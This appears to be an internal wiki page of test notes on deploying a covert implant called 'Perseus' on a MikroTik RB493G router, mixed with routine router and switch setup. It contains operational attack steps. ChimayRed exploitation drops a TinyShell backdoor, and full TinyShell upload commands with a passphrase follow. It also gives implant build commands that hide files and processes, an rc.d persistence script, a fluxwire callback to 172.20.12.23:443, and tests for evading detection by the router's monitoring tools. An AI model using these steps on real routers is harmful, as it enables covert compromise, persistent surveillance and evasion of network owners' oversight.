@@ -1,0 +1,651 @@
+
+                        Owner: User #14587667
+Perseus 1.1.0b1 Mikrotik RB493G - Test 1 Notes
+Perseus 1.1.0 Beta 1MikroTik RB493G
+General Info
+WAN (from TR-Core) 172.20.100.4/30TR-CoreSwx: 172.20.100.5    Perseus: 172.20.100.6
+TR-Core Switch Route: 192.168.88.0/27 -> 172.20.100.6  (This gives the Perseus LANLocal Area Network 30 host IPs)
+ICON-CR: 172.20.12.23/24
+LAN Hosts:
+192.168.88.2  Perseus Test1 -1.1.0b1 - UbuntuDesktop 14.10 x64
+192.168.88.3  Windows 7 VM
+VLAN 10 IP: 192.168.0.1
+Cisco 2960: 192.168.0.2
+4/3/2015
+
+Changed RB493G ether1 IP to 172.20.100.6/30.
+Changed RB493G ether2 IP to 192.168.88.1/24.
+Default IP: 192.168.88.1/24
+Figure out how to run ChimayRed and TinyShell (TshPatcher).
+
+4/8/2015
+
+Unable to connect RB493G to Console server.  Checked MT website and confirmed settings, but no luck.
+Downloaded and upgraded MT f/w to v6.27
+Move Windows VMVirtual Machine to VLAN-602 (Perseus Internal).
+Use Winbox to upload new f/w.  Copy "routeros-mipsbe-6.27.npk" using the Files List window.
+
+Select System -> Reboot.  Once rebooted, the new version number (6.27) will be seen in the Winbox Title.
+
+
+
+4/9/2015
+Setup TR-Core route to 192.168.88.0/27
+ip route 192.168.88.0 255.255.255.224 172.20.100.6 name Perseus-MT_RB493G
+
+Add default route (0.0.0.0/0 via 172.20.100.5) for MT (IP -> Routes): 
+
+Setup ACLAccess Control List (on TR-Core) to restrict VLANVirtual Local Area Network access (see Access List Configuration section below for settings).
+Configure NATNetwork Address Translation on RS493G using the following rule (IP -> Firewall -> NATNetwork Address Translation): 
+
+Delete 'Serial0' port under System -> Console.
+Setup NTPNetwork Time Protocol client (System -> SNTP Client): 
+
+Apply ACLs to VLAN601 (Perseus WANWide Area Network)
+
+4/10/2015
+
+Worked with Bingham to throw ChimayRed and TinyShell on MT RB-493G.
+Here is the order exploits/tools are used operationally:  
+Package TinyShell with port, key, architecture, and shell (optional)
+Use ChimayRed to upload exploit (TinyShell) to MT.  Requires access to port 8291 and 80.
+Connect to TinyShell.  You are now in an encrypted session between ICON and the MT.
+Upload BusyBox and/or Perseus.
+For more specific details refer to the step-by-step guide Chimay Red, TinyShell, and BusyBox Quick Start Guide  .
+
+
+
+
+
+ID
+Status
+Task
+
+
+3
+complete
+
+User #14587667 Need to get BusyBox binary from Bingham (Make sure I can log into OSN first).
+
+
+4
+complete
+
+User #14587667 Use ChimayRed to upload BusyBox on MT.  Use COGComputer Operations Group version of BB.
+
+
+5
+complete
+User #14587667 Review ICON script/notes to flush out instructions above
+
+
+4/13/2015
+
+Reset MT and exploited again using ChimayRed and TinyShell.
+Copied BusyBox binary from OSN to Devlan.  Confirmed with Bingham that this is the current version that COG/NOD is using (mips-be version)
+Uploaded BusyBox (COGComputer Operations Group version) to MT using TinyShell.
+
+4/14/2015
+
+
+ID
+Status
+Task
+
+
+6
+incomplete
+
+User #14587667 Finding: I had a TS connection opened and it was sitting idle for a while (maybe about 45 min).  When I came back to remote shell, it was hung.  Ctrl-C, Ctrl-Z, did not work.  Nothing appears when I type.
+
+
+
+7
+complete
+
+User #14587667 Bug??: After running ./start, I touched a file named /flash/boot/hi.txt and it was not hidden. After re-deploying P it was hidden
+
+
+
+13
+incomplete
+User #14587667 Caution: Do not make removal trigger a read-only partition.  If so, how do you trigger removal?
+
+
+14
+incomplete
+
+User #14587667 Bug??: Did timestamp of /flash/boot change when Perseus installed? 
+
+
+
+15
+complete
+
+User #14587667 Bug??: When I hide busybox it no longer lets me use it.
+
+
+
+Talked with User #73764 on the phone.  Secure delete is kicking and deleting the files Perseus should be hiding.  User #73764 needs to research this some more and will get back in touch with me tomorrow.
+4/16/2015
+
+
+User #73765 requested configuration and log files of the Perseus installation and execution.  2015-04-16_063833-Perseus-Install_Log.log
+
+
+User #73764 and User #73765 came over to DD2 and User #73764 worked with me to troubleshoot the MT.  It turns out that the kernel had been deleted by secure delete.  User #73764 and User #73765 took the MT back with them to TP to perform further analysis.
+
+ 
+4/27/2015
+Re-configured MT with WAN, LAN, NATNetwork Address Translation settings.  Device had been bricked and was reset by TP.
+
+
+ID
+Status
+Task
+
+
+21
+incomplete
+
+User #14587667 Is this a CR bug?? If so, does it need to be reported? Error when throwing CR 
+
+
+
+22
+complete
+
+User #14587667 Shouldn't this be hidden.  It was built with this command "python perseus_1.1.0.0b1_routeros6_mips.zip -f /flash/boot/hidden -f /flash/etc/rc.d/run.d/S99mcc -f /tmp/tshd-mipsbe -d /flash/boot/hidden -d /tmp/tshd-mipsbe -S /flash/boot/hidden/start -s 1 -m /flash/boot/hidden/mcc.ko -r /tmp/dont_panic deploy"Resolution: I spoke with User #73764 and Perseus hides the absolute path.  In this case /tmp is a symlink to /rw/tmp and /rw/tmp is a symlink to /flash/rw/tmp.  So /tmp is a symlink to /flash/rw/tmp.  The full path needed to hide /tmp/tshd-mipsbe is actually /flash/rw/tmp/tsh-mipsbe.
+
+
+
+4/28/2015
+
+Spoke with User #73764 to troubleshoot why /tmp/tshd-mipsbe is not hidden when running "ps ax" (Notes under 4/27/2015).
+Refer to "2015-04-28_110134-Perseus-ICON_window1 TS process not hidden w new command" for logs.
+
+
+
+ID
+Status
+Task
+
+
+26
+complete
+
+User #14587667 Determine how to make TS startup after reboot.  User #73764 suggested placing a startup script in /flash/etc/rc.d/run.d/S99tsh which will launch TS.  Also need to upload TS to /flash/boot/hidden (/tmp is not persistent).
+
+
+
+4/29/2015
+
+Created startup script to make tsh persistent (/flash/etc/rc.d/run.d/S99tsh).
+Although tsh is not hidden when run from /tmp/tshd-mipsbe, it is hidden when it is run from /flash/boot/hidden/tshd-mipsbe (after reboot).
+Current parameters used to generate perseus:       python perseus_1.1.0.0b1_routeros6_mips.zip -f /flash/boot/hidden -f /flash/etc/rc.d/run.d/S99mcc -f /flash/etc/rc.d/run.d/S99tsh -d /flash/boot/hidden -p /flash/rw/tmp/tshd-mipsbe -S /flash/boot/hidden/start -s 1 -m /flash/boot/hidden/mcc.ko -r /flash/boot/hidden/dont_panic deploy
+
+
+
+
+ID
+Status
+Task
+
+
+27
+complete
+User #14587667 When a process is started and then the originating binary is deleted (the process is still running), Perseus does not hide it.  
+
+
+ 
+5/4/2015
+Put together step by step instructions for TP to replicate bug PS-1.
+5/5/2015
+
+
+ID
+Status
+Task
+
+
+28
+complete
+User #14587667 Check these counters when using Perseus to see if it affects the counters 
+
+
+5/11/2015
+
+
+ID
+Status
+Task
+
+
+29
+incomplete
+Tsh traffic does show up in Torch when executing commands from ICON 
+
+
+
+Installed Cacti server (192.168.0.8/24)
+Racked Cisco 2960 to extend MT network.  Added subnet 192.168.0.0/24.
+Added VLANs 605, 606, 607 so hosts can be added to Cisco 2960/MT LAN2 for testing.
+
+5/12/2015
+
+Configured RB493G to send syslog and SNMPSimple Network Management Protocol to Cacti server.
+Fixed Cacti rsyslog config (/etc/rsyslog.conf) and added instructions to Linux confluence page.
+
+Setup port-forward from WANWide Area Network IP to Cacti server.
+
+
+Create trunk between RB493G and Cisco 2960 and connect two host VMsMT Settings: (switchports) (bridge)   (ip address) (interfaces)  Cisco Settings: 
+
+
+5/13/2015
+Configured Cisco 2960
+NTP client (ntp server 172.20.100.5)
+Default gateway (int vlan 10; ip default-gateway 192.168.0.1)
+Setup syslog (service timestamps log datetime localtime; logging 192.168.0.8; logging trap informational)
+
+
+5/18/2015
+
+Configure fluxflx-packer -s linux:mipsbe:mikrotik:6.x -o mt-fw_node -k aaaabbbbccccdddd --link "ip4=172.20.12.23 tcp=443 watchdog=0:0" -m 1250
+
+
+User #73766 confirmed with CANDILIS that fluxwire 3.3 was successfully run on a MikroTik running ROS 6.27.  He did not confirm it was BE or LE.
+I am having trouble running fluxwire 3.3 on the RB493G running ROS 6.27.  I was able to successfully create an Ubuntu flux node (using the same commands with the only difference being the target architecture).
+I was unable to run fluxwire when perseus was installed.  The process never appeared in the process list.  I tried running it from both hidden and non-hidden directories.  As soon as I removed perseus, fluxwire ran just fine.This was not a Perseus bug.  See notes from 5/19 for solution.
+
+
+5/19/2015
+The fluxwire node will not start if you try to run it from outside the directory it resides in.  In other word, you must first cd to the binary's directory.
+
+
+ID
+Status
+Task
+
+
+31
+complete
+Ask User #73764 why they recommend /flash/boot.  Is it because secure-delete is quicker?
+
+
+5/26/2015
+
+Configured console server for RB493G and RB450G (Rack 6).
+Username: admin
+Password: <none>
+
+
+Setup P2P link between RB493G and RB450G.
+On 493G: ip address add address=10.0.0.1 netmask=255.255.255.252 interface=ether4 comment=To_RB450G_ether4
+On 450G: ip address add address=10.0.0.2 netmask=255.255.255.252 interface=ether4 comment=To_RB493G_ether4
+
+
+Setup additional LANLocal Area Network interface on RB450G:/ip address add address=192.168.20.1/24 interface=ether5
+
+
+Setup RIP routing between RB493G and RB450G
+
+
+On 493G: 
+
+/routing rip interface add interface=ether4 comment="RIP to RB450"
+/routing rip interface add interface=ether6
+/routing rip set redistribute-connected=yes
+/routing rip network add network=192.168.0.0/24
+/routing rip network add network=10.0.0.0/30
+
+
+
+On 450G: 
+
+/routing rip interface add interface=ether4 comment="RIP to RB493"
+/routing rip set redistribute-connected=yes
+/routing rip network add network=192.168.20.0/24
+
+
+Verify routes:  /routing rip route print
+
+
+
+Notes
+
+Perseus only deletes files/directories that are specified to be hidden.
+If secure delete is not used, but mcc is revereted manually (using /tmp/busybox rmmod mcc) ...
+To hide an executable, the absolute path to the binary must be specified using the -p option.  The MT uses many symlinks (ie. /tmp is a symlink for /flash/rw/tmp), so be sure to determine the absolute path.  You can use the "readlink -f <path>" command to show the absolute path. 
+
+If ts is running from a hidden directory and perseus is removed (by touching trigger file), then the tshd process is no longer hidden and appears in the process list.  So if tsh was run from /flash/boot/hidden/tshd-mipsbe the directory /flash/boot/hidden is deleted, but /flash/boot/hidden/tshd-mipsbe shows up in the process list (ps ax).
+
+ 
+Install Perseus
+
+
+ID
+Status
+Task
+
+
+20
+incomplete
+User #14587667 Update these steps.  for current instructions, refer to \\10.9.8.21\share\Testing\Perseus 1.1.0b1\2015-04-15 Perseus Commands.txt
+
+
+
+Copy perseus_1.1.0_routers6_mips.zip to ICON VM.
+Build the installation package$ python perseus_1.1.0.0b1_routeros6_mips.zip -f /flash/boot -f /tmp/busybox2 -d /flash/boot -d /flash/data -S /flash/boot/start -s 1 -m /flash/boot/mcc.ko -r /tmp/dont_panic deploy
+
+Create /tmp/hidden directory on MT.$ ~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase# mkdir /tmp/hidden # exit
+Upload Perseus to MT.  The prerequisites for this include CR, TS, and BB (optional).From ICON, execute the commands: $ ~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase put ~/Desktop/deploy_perseus_1.1.0.0b1_routeros6_mips/mcc.ko /flash/boot$ ~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase put ~/Desktop/deploy_perseus_1.1.0.0b1_routeros6_mips/S99mcc /flash/boot$ ~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase put ~/Desktop/deploy_perseus_1.1.0.0b1_routeros6_mips/start  /flash/boot
+Make "start" executable# chmod +x /tmp/perseus/start
+Start Perseus implant# /flash/boot/start
+
+ 
+Useful MT commands:
+
+
+Command
+Description
+
+
+/ip route print
+Print list of IP addresses configured for router
+
+
+/system console print
+Display list of console ports
+
+
+/port print
+Check if application is using port
+
+
+/port print detail
+Display port settings (baud, data rate, etc)
+
+
+/system serial-terminal serial0
+Connect to serial port
+
+
+export file <filename>
+Backup config
+
+
+ 
+Access List Configuration
+Create ACL
+ip access-list ext Perseus-WANpermit ip host 172.20.100.6 host 172.20.12.23deny ip any any log
+show access-list
+Apply ACLAccess Control List to VLAN
+int vlan 601ip access-group Perseus-WAN in
+show access-list Perseus-WAN
+Add statement to ACLAccess Control List and resequence
+ip access-list ext Perseus-WAN15 permit ip host 172.20.100.6 host 172.20.100.5ip access-list resequence Perseus-WAN 10 10
+Show Access List hits
+show log | inc list Perseus-WAN
+Areas to test
+
+
+ID
+Status
+Task
+
+
+8
+incomplete
+stapmer.py
+
+
+def parse_args(self, args): # XXX TODO Bounds checks # XXX Add checking for os version file, mcc, hide_files
+
+
+ID
+Status
+Task
+
+
+9
+incomplete
+Network latency
+
+
+Decreate network latency <40%
+
+
+ID
+Status
+Task
+
+
+10
+incomplete
+File remnants after Perseus removal
+
+
+11
+complete
+Running processes ("ps ax")
+
+
+12
+incomplete
+bouncing VMVirtual Machine / restarting networking service
+
+
+17
+incomplete
+change MTU
+
+
+18
+incomplete
+change latency
+
+
+30
+incomplete
+Use MT Torch tool while implanting and see if anything is detected.
+
+
+19
+complete
+Check available disk space (does it change after implanted?)
+
+
+ 
+
+Comments:
+
+
+2015-04-15 11:46 
+[User #71467]: 
+
+Nice screenshots 
+
+
+
+
+Attachments:
+
+
+image2015-5-12 13:14:30.png
+
+
+image2015-5-12 13:13:4.png
+
+
+image2015-5-12 13:11:35.png
+
+
+image2015-5-12 13:11:0.png
+
+
+image2015-5-12 12:18:52.png
+
+
+image2015-5-12 12:17:45.png
+
+
+image2015-5-12 8:23:57.png
+
+
+image2015-5-12 8:23:25.png
+
+
+image2015-5-12 8:23:12.png
+
+
+image2015-5-11 8:56:55.png
+
+
+image2015-5-5 9:44:14.png
+
+
+image2015-4-29 13:24:20.png
+
+
+image2015-4-29 13:23:56.png
+
+
+image2015-4-28 11:4:9.png
+
+
+image2015-4-27 12:13:25.png
+
+
+image2015-4-27 11:59:50.png
+
+
+image2015-4-27 11:59:25.png
+
+
+image2015-4-27 10:46:48.png
+
+
+image2015-4-27 10:46:9.png
+
+
+image2015-4-27 10:36:26.png
+
+
+2015-04-16_063833-Perseus-Install_Log.log
+
+
+image2015-4-14 12:35:37.png
+
+
+image2015-4-14 12:33:50.png
+
+
+image2015-4-14 11:3:2.png
+
+
+image2015-4-14 10:52:7.png
+
+
+image2015-4-14 10:50:58.png
+
+
+image2015-4-14 10:39:20.png
+
+
+image2015-4-14 10:0:41.png
+
+
+image2015-4-9 7:47:39.png
+
+
+image2015-4-9 7:41:29.png
+
+
+image2015-4-9 6:46:6.png
+
+
+image2015-4-8 8:27:37.png
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 
+| 24 
+| 25 
+| 26 
+| 27 
+| 28 
+| 29 
+| 30 
+| 31 
+| 32 
+| 33 
+| 34 
+| 35 
+| 36 
+| 37 
+| 38 
+| 39 
+| 40 
+| 41 
+| 42 
+| 43 
+| 44 
+| 45 
+| 46 
+| 47 
+| 48 
+| 49 
+| 50 
+| 51 
+| 52 
+| 53 
+| 54 
+| 55 
+| 56 
+| 57 
+| 58 
+| 59 
+| 60 
+| 61 
+| 62 
+| 63 
+| 64 
+| 65 
+| 66 
+| 67 
+| 68 
+| 69 
+| 70 
+| 71 
+| 72 
+| 73 
+| 74 
+| 75 
+| 76 
+| 77 
+|
+                    
